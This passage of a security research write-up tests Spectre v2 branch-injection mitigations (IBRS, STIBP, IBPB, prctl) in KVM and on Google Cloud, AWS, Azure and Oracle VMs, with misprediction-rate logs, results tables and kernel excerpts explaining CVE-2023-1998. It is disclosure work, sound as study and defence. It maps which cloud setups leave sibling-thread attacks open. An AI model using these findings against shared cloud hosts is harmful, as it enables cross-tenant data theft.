</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-STIBP on core 1:
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 1
</span></span><span class=line><span class=cl>writing msr[72]=2 on core 1
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 1
</span></span><span class=line><span class=cl>Rate: 1/1000  MSR[72]=2    -&gt; CVE 2023-0045 trace
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>Rate: 0/1000  MSR[72]=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Total misspredict rate: 1/10000 (0.01 %)
</span></span><span class=line><span class=cl>current value msr[72]=2 on core 1
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-PRCTL on core 1:
</span></span><span class=line><span class=cl>PRCTL GET value 0x9
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 999/1000   MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 999/1000   MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Total misspredict rate: 9998/10000 (99.98 %)
</span></span></code></pre></td></tr></table></div></div><p><strong>The PRCTL syscall on this kernel fails to mitigate SMT BTI attacks inside the default KVM</strong>. Further investigation showed that in this case, besides KVM allowing proper MSR writes, the Linux kernel only implements the STIBP mitigation if the processor is executing in SMT (which makes sense on a Bare Metal system):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=n>__always_inline</span> <span class=kt>void</span> <span class=nf>__speculation_ctrl_update</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>tifp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>						      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>tifn</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=p>[...]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/* Only evaluate TIF_SPEC_IB if conditional STIBP is enabled. */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nf>IS_ENABLED</span><span class=p>(</span><span class=n>CONFIG_SMP</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>	    <span class=nf>static_branch_unlikely</span><span class=p>(</span><span class=o>&amp;</span><span class=n>switch_to_cond_stibp</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>updmsr</span> <span class=o>|=</span> <span class=o>!!</span><span class=p>(</span><span class=n>tif_diff</span> <span class=o>&amp;</span> <span class=n>_TIF_SPEC_IB</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>msr</span> <span class=o>|=</span> <span class=nf>stibp_tif_to_spec_ctrl</span><span class=p>(</span><span class=n>tifn</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>updmsr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>write_spec_ctrl_current</span><span class=p>(</span><span class=n>msr</span><span class=p>,</span> <span class=nb>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Even though both cores are siblings on the host, the guest OS believes they are not siblings (due to how the hypervisor exposes the hardware) and therefore STIBP is not necessary. This explains why MSR[72]=0 during the prctl mitigation. Reading <code>/sys/devices/system/cpu/cpu0/topology/thread_siblings_list</code> on guest shows that there is only one sibling core:</p><p><code>0</code></p><p>versus 2 on the guest:</p><p><code>0,4</code></p><h2 id=tests-on-google-cloud>Tests on google cloud<a hidden class=anchor aria-hidden=true href=#tests-on-google-cloud>#</a></h2><h4 id=results-for-gcp-n1-standard-2-intel_haswell>Results for gcp-n1-standard-2-Intel_Haswell:<a hidden class=anchor aria-hidden=true href=#results-for-gcp-n1-standard-2-intel_haswell>#</a></h4><p>Google cloud shows that mitigations are available for spectre-BTI:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Checking for vulnerabilities on current system
</span></span><span class=line><span class=cl>Kernel is Linux 5.15.0-1025-gcp #32-Ubuntu SMP Wed Nov 23 21:46:01 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is Intel(R) Xeon(R) CPU @ 2.30GHz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  YES
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  YES
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
</span></span></code></pre></td></tr></table></div></div><p>Google cloud output shows some different results than the ones observed in bare metal and KVM: It&rsquo;s never possible to write another value other than 1 to IA32_SPEC_CTRL.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-nospecctrl on core 0: 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=0 on core 0 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=1
</span></span><span class=line><span class=cl>Total misspredict rate: 9979/10000 (99.79 %)
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0.879s
</span></span><span class=line><span class=cl>user	0m0.267s
</span></span><span class=line><span class=cl>sys	0m0.082s
</span></span></code></pre></td></tr></table></div></div><p>This behavior is odd. Because the IA32_SPEC_CTRL is set (IBRS), but speculation still happens, and there isn&rsquo;t an overhead associated with disabling the speculation:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-IBRS on core 0: 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>writing msr[72]=1 on core 0 
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>Rate: 995/1000  MSR[72]=1
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 9945/10000 (99.45 %)
</span></span><span class=line><span class=cl>current value msr[72]=1 on core 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m0.877s
</span></span><span class=line><span class=cl>user	0m0.332s
</span></span><span class=line><span class=cl>sys	0m0.017s
</span></span></code></pre></td></tr></table></div></div><p>The time here for finishing the task is 0.877s, similar to the 0.7s on bare metal and shorter than the 1.5s for IBRS on bare metal, with Haswell CPUs. That might indicate that the hypervisor is reporting a value that is not really set in the MSR.</p><p>Since it´s not possible to enable STIBP, PRCTL is expected to fail on the sibling attack, even if prctl doesn&rsquo;t throw an error:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing victim-PRCTL on core 1: 
</span></span><span class=line><span class=cl>PRCTL GET value 0x9
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Total misspredict rate: 9920/10000 (99.20 %)
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.79 %</td><td>99.90 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>99.45 %</td><td>0.01 % (1)</td><td>No</td></tr><tr><td>STIBP</td><td>90.47 %</td><td>87.62 %</td><td>No</td></tr><tr><td>IBPB</td><td>99.78 %</td><td>0.01 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.00 %</td><td>97.57 %</td><td>No</td></tr></tbody></table><p>(1) This result might be a false negative, since repeating the experiment shows higher speculation rates as observed in the data collected.</p><p><strong>The results show that the only effective mitigation in this machine is IBPB and that the PRCTL-based mitigation is ineffective due to lack of STIBP.</strong></p><h4 id=results-for-gcp-debian-10-haswell>Results for gcp-debian-10-haswell:<a hidden class=anchor aria-hidden=true href=#results-for-gcp-debian-10-haswell>#</a></h4><p>We had a surprise though when after starting a Debian 10 machine in the same processor consistently allowed for an MSR write on the IA32_SPEC_CTRL register:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Checking for vulnerabilities on current system
</span></span><span class=line><span class=cl>Kernel is Linux 4.19.0-22-cloud-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64
</span></span><span class=line><span class=cl>CPU is Intel(R) Xeon(R) CPU @ 2.30GHz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: YES 
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability: YES  (SPEC_CTRL feature bit)
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit)
</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  YES 
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability:  YES (Intel STIBP feature bit)
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.81 %</td><td>93.45 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.01 %</td><td>00.03 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>99.63 %</td><td>0.02 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>0.02 %</td><td>86.21 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.02 %</td><td>0.04 % (1)</td><td>Yes</td></tr></tbody></table><p>(1) It is possible to see that the speculation rate is different than zero, but it is unclear if it&rsquo;s measurement noise or an actual vulnerability as will be discussed later.</p><p>Obviously just changing the OS should not give different MSR values, since it is highly unlikely that the hypervisor would show a different behavior based on the OS (kernel). Our first guess was that when choosing a different OS we were getting into a different pool of machines. But that also seemed unlikely. We have decided to then upgrade the older system kernel, and oddly, saw the previous behavior again (but now we were certain we were in the same machine since the reboot was too fast for us to have had a live migration). Our next theory was that the different kernels were using different mitigation strategies (IBRS versus IBPB with STIBP). By starting the new upgraded system with ‘mitigations=off’ kernel parameter, we’ve noticed that we were now able again to write in the MSRs. We then tested the other machine, and indeed, with</p><p>‘mitigations=off’, we were able to write to the MSRs.</p><p>Further investigation showed this behaviour was caused by a kernel bug as described by CVE 2023-1998.</p><h4 id=cve-2023-1998-spectre-v2-smt-mitigations-problem-16>CVE 2023-1998: Spectre v2 SMT mitigations problem <sup id=fnref:16><a href=#fn:16 class=footnote-ref role=doc-noteref>16</a></sup><a hidden class=anchor aria-hidden=true href=#cve-2023-1998-spectre-v2-smt-mitigations-problem-16>#</a></h4><p>Later research explains this behaviour due a bug in the Linux Kernel that prevents the guest to properly select STIBP as a mitigation when IBRS is choosed to protect the Kernel. The Bare metal haswell reports the cpu not being vulnerable to RETBLEED, but the CPU on google cloud reports RETBLEED as one of its bugs.</p><p>oxigenio2-result.txt:</p><p>bugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_unknown</p><p>gcp-n1-standard-2-intel_Haswell-result.txt</p><p>bugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs mmio_stale_data retbleed</p><p>This forces the CPU on google cloud to choose IBRS as mitigation for the kernel. The bug lies in the logic of mitigation selection (<a href=https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196)>https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196)</a>. The comments state that if the CPU is using IBRS, STIBP is not necessary wich is wrong, this is only valid for eIBRS.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-.c data-lang=.c><span class=line><span class=cl> <span class=cm>/* 
</span></span></span><span class=line><span class=cl><span class=cm>  * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible,
</span></span></span><span class=line><span class=cl><span class=cm>  * STIBP is not required.
</span></span></span><span class=line><span class=cl><span class=cm>  */</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>boot_cpu_has</span><span class=p>(</span><span class=n>X86_FEATURE_STIBP</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=o>!</span><span class=n>smt_possible</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=nf>spectre_v2_in_ibrs_mode</span><span class=p>(</span><span class=n>spectre_v2_enabled</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>This explains why every read is 1 on google cloud guests and the mitigation is broken, since the read is done by msr kernel driver wich is set to IBRS on kernel entry and clear the SPEC_CTRL MSR on kernel exit, leaving the victim exposed to SMT attacks. It also explains why setting ‘mitigations=off’ allows the direct mitigation usign the msr module, since the SPEC_CTRL MSR is no longer modied when transitioning between kernel and user mode.</p><h2 id=tests-on-aws-ec2>Tests on AWS EC2<a hidden class=anchor aria-hidden=true href=#tests-on-aws-ec2>#</a></h2><p>The AWS EC2 instances don&rsquo;t enumerate hardware mitigations, leading to SPEC_CTRL MSR being always 0 and IBPB not working:</p><h4 id=results-for-aws-t2medium>Results for aws-t2.medium:<a hidden class=anchor aria-hidden=true href=#results-for-aws-t2medium>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Checking for vulnerabilities on current system
</span></span><span class=line><span class=cl>Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: YES
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability: NO
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability: NO
</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: YES
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability: NO
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Testing victim-PRCTL on core 0: 
</span></span><span class=line><span class=cl>prctl: Operation not permitted
</span></span><span class=line><span class=cl>PRCTL GET value 0x2
</span></span><span class=line><span class=cl>Rate: 999/1000  MSR[72]=0
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=0
</span></span><span class=line><span class=cl>Total misspredict rate: 9995/10000 (99.95 %)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0m1.827s
</span></span><span class=line><span class=cl>user	0m0.328s
</span></span><span class=line><span class=cl>sys	0m0.000s
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.86 %</td><td>0.09 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>99.79 %</td><td>0.06 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>99.89 %</td><td>0.11 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>36.82 %</td><td>0.05 %</td><td>No</td></tr><tr><td>PRCTL</td><td>99.95 %</td><td>0.10 %</td><td>No</td></tr></tbody></table><p>Since the enumeration using CPUID doesn&rsquo;t show support for IBPB, the prctl syscall fails and no mitigations are applied. A similar result can be found for t3 instances.</p><h4 id=results-for-aws-t3anano>Results for aws-t3a.nano:<a hidden class=anchor aria-hidden=true href=#results-for-aws-t3anano>#</a></h4><p>EC2 t3a instances use AMD processors, showing that this problem is not exclusive to Intel processors. In the t3a instances tested it isn&rsquo;t possible to read or write to the MSRs, and prctl also fails with <code>operation not permitted</code> error.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is AMD EPYC 7571
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  NO
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability:  NO 
</span></span><span class=line><span class=cl>    * CPU indicates preferring IBRS always-on:  NO 
</span></span><span class=line><span class=cl>    * CPU indicates preferring IBRS over retpoline: NO 
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability:  NO 
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>76.58 %</td><td>99.87 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>57.67 %</td><td>99.87 %</td><td>No</td></tr><tr><td>STIBP</td><td>28.44 %</td><td>99.92 %</td><td>No</td></tr><tr><td>IBPB</td><td>75.19 %</td><td>99.84 %</td><td>No</td></tr><tr><td>PRCTL</td><td>73.91 %</td><td>99.85 %</td><td>No</td></tr></tbody></table><h2 id=tests-on-azure>Tests on Azure<a hidden class=anchor aria-hidden=true href=#tests-on-azure>#</a></h2><h4 id=results-for-azure-d2sv3>Results for azure-d2sv3:<a hidden class=anchor aria-hidden=true href=#results-for-azure-d2sv3>#</a></h4><p>The results for this machine are similar to the t3a instance. It&rsquo;s impossible to read or write from any SPEC_CTRL MSRs and all scenarios are vulnerable, even though it&rsquo;s a Haswell CPU.</p><h4 id=results-for-azure-ubuntu22-f2s-v2>Results for azure-ubuntu22-F2s-v2:<a hidden class=anchor aria-hidden=true href=#results-for-azure-ubuntu22-f2s-v2>#</a></h4><p>This machine contains a Xeon(R) Platinum 8272CL (Cascade Lake). Our tests show that Cascade Lake CPUs are highly resilient against SMT attacks. IBPB can’t be used on this VM, it&rsquo;s not possible to read or write from SPEC_CTRL MSR and prctl fails. Given the tests show the system is not vulnerable, we conclude that the hardware mitigation is forced-enabled.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Checking for vulnerabilities on current system
</span></span><span class=line><span class=cl>Kernel is Linux 5.15.0-1029-azure #36-Ubuntu SMP Mon Dec 5 19:31:08 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: NO 
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability: NO 
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability: NO 
</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: NO 
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability: NO 
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>98.81 %</td><td>0.01 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.00 %</td><td>0.01 %</td><td>No (1)</td></tr><tr><td>STIBP</td><td>99.94 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>99.94 %</td><td>0.01 %</td><td>No</td></tr><tr><td>PRCTL</td><td>99.90 %</td><td>0.00 %</td><td>No</td></tr></tbody></table><p>(1) But not vulnerable, so we assume forced enabled</p><h2 id=tests-on-oracle-cloud>Tests on Oracle Cloud<a hidden class=anchor aria-hidden=true href=#tests-on-oracle-cloud>#</a></h2><p>Intel CPUs tested on Oracle Cloud work as expected, but the AMD CPU tested only enumerates the IBPB mitigation, leaving sibling thread attacks exposed. Since the PRCTL can execute IBPB, the syscall succeeds, but it&rsquo;s not enough to protect the process.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Kernel is Linux 5.15.0-1021-oracle #27-Ubuntu SMP Fri Oct 14 20:04:26 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is AMD EPYC 7551 32-Core Processor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: NO
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability: NO 
</span></span><span class=line><span class=cl>    * CPU indicates preferring IBRS always-on: NO 
</span></span><span class=line><span class=cl>    * CPU indicates preferring IBRS over retpoline: NO 
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability: YES (IBPB_SUPPORT feature bit)
